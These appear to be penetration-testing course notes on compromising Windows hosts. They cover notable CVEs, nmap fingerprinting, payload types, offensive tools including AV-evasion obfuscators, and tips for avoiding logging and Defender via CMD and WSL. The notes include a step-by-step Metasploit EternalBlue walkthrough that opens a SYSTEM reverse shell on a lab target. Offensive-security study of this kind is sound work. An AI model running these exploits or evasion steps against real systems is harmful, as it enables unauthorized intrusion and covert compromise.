# 09 — Infiltrating Windows

## Overview

Windows dominates enterprise environments, making it the most common target. This section covers Windows-specific fingerprinting, notable exploits, payload file types, and a full compromise walkthrough using EternalBlue.

---

## Prominent Windows Exploits to Know

| Vulnerability | CVE / ID | Impact | Attack Vector |
|--------------|----------|--------|---------------|
| **MS08-067** | CVE-2008-4250 | RCE via SMB flaw | Used by Conficker worm and Stuxnet |
| **EternalBlue** | MS17-010 | RCE via SMBv1 | WannaCry, NotPetya — 200,000+ hosts in 2017 |
| **PrintNightmare** | CVE-2021-34527 | RCE via Print Spooler | Install printer driver → SYSTEM shell |
| **BlueKeep** | CVE-2019-0708 | RCE via RDP | Affects Windows 2000 through Server 2008 R2 |
| **SigRed** | CVE-2020-1350 | RCE via DNS SIG records | Compromises DNS server → Domain Admin |
| **SeriousSAM** | CVE-2021-36934 | Credential theft | Non-elevated users can read SAM via shadow copies |
| **Zerologon** | CVE-2020-1472 | Domain Admin via Netlogon | ~256 guesses to crack computer account password |

---

## Fingerprinting: Is It Windows?

### Method 1: TTL Value (Ping)

```bash
ping 192.168.86.39
```

| TTL Value | Likely OS |
|-----------|-----------|
| **128** | **Windows** |
| **64** | Linux |
| **254** | Cisco/Network device |

> TTL decrements by 1 per hop. If you see ~128, it's Windows.

### Method 2: Nmap OS Detection

```bash
sudo nmap -v -O TARGET_IP
```

Look for:
```
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

> Use `-A -Pn` if initial scan gives poor results. Firewalls can skew detection.

### Method 3: Banner Grabbing

```bash
sudo nmap -v TARGET_IP --script banner.nse
```

> Connects to each open port and grabs service banners for identification.

### Windows Port Fingerprint

| Port | Service | Indicator |
|------|---------|-----------|
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | Windows networking |
| 445 | SMB | Windows file sharing |
| 3389 | RDP | Remote Desktop |
| 5985 | WinRM | PowerShell Remoting |

> Seeing 135 + 139 + 445 together is almost always Windows.

---

## Windows Payload File Types

| Type | Extension | Use Case |
|------|-----------|----------|
| **DLL** | `.dll` | DLL injection / hijacking → SYSTEM privesc, bypass UAC |
| **Batch** | `.bat` | Automate commands via cmd.exe — open ports, run enumeration |
| **VBScript** | `.vbs` | Client-side phishing — macro-enabled docs, browser exploitation |
| **MSI** | `.msi` | Windows Installer packages — run with `msiexec` for elevated shells |
| **PowerShell** | `.ps1` | Full .NET access, cmdlets, cloud interaction — most versatile |
| **EXE** | `.exe` | Standard executable — MSFvenom output, custom tools |

---

## Payload Generation & Delivery Resources

| Resource | Purpose |
|----------|---------|
| **MSFvenom / Metasploit** | Swiss-army knife — generate payloads, exploit, post-exploit |
| **Payloads All The Things** | Cheat sheets and one-liners for every scenario |
| **Mythic C2** | Alternative C2 framework with custom payload generation |
| **Nishang** | Offensive PowerShell scripts and implants |
| **Darkarmour** | Obfuscated binary generation for AV evasion |

### Delivery Methods

| Method | Tool/Protocol |
|--------|---------------|
| SMB shares | Impacket smbclient, `ADMIN$`, `C$` |
| Remote execution | MSF exploit modules (auto-deliver) |
| File transfer protocols | FTP, TFTP, HTTP/S |
| Social engineering | Email, download link, USB |

---

## Full Compromise Walkthrough: EternalBlue

### Step 1: Enumerate

```bash
nmap -v -A 10.129.201.97
```

**Key findings:** Windows Server 2016, ports 80 (IIS), 135, 139, 445 open.

### Step 2: Validate Vulnerability

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.129.201.97
msf6 > run
```

```
[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010!
```

### Step 3: Select Exploit

```
msf6 > search eternal
msf6 > use exploit/windows/smb/ms17_010_psexec
```

### Step 4: Configure Options

```
msf6 > set RHOSTS 10.129.201.97
msf6 > set LHOST 10.10.14.12
msf6 > set LPORT 4444
```

### Step 5: Exploit

```
msf6 > exploit
```

```
[+] Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Step 6: Drop to System Shell

```
meterpreter > shell

C:\Windows\system32>
```

---

## CMD vs PowerShell: When to Use Which

| Factor | CMD | PowerShell |
|--------|-----|------------|
| **Logging** | ❌ No command history | ✅ Records commands (less stealthy) |
| **Execution Policy** | Not affected | Can block script execution |
| **UAC** | Not affected | Can interfere |
| **Output type** | Plain text | .NET objects |
| **Capabilities** | Basic commands, batch files | Cmdlets, .NET, cloud, modules |
| **Availability** | All Windows versions | Windows 7+ only |
| **Stealth** | ✅ Better | ❌ More logged and monitored |

### Use CMD when:
- Older host (XP or earlier — no PowerShell)
- Stealth matters (no command logging)
- Simple tasks, `net` commands, basic enumeration
- Execution policy might block scripts

### Use PowerShell when:
- Need cmdlets or .NET interaction
- Working with cloud services
- Running custom scripts or modules
- Stealth is less important

---

## Blind Spots: WSL & PowerShell Core

| Feature | Why It's Dangerous |
|---------|-------------------|
| **WSL (Windows Subsystem for Linux)** | Network requests from WSL bypass Windows Firewall and Defender |
| **PowerShell Core on Linux** | Carries PowerShell functions to Linux, evades Linux-focused detection |
| **Python via WSL** | Attackers use Python3 + Linux binaries to download payloads — Defender doesn't see it |

> These are emerging attack vectors — not widely detected yet by AV/EDR.
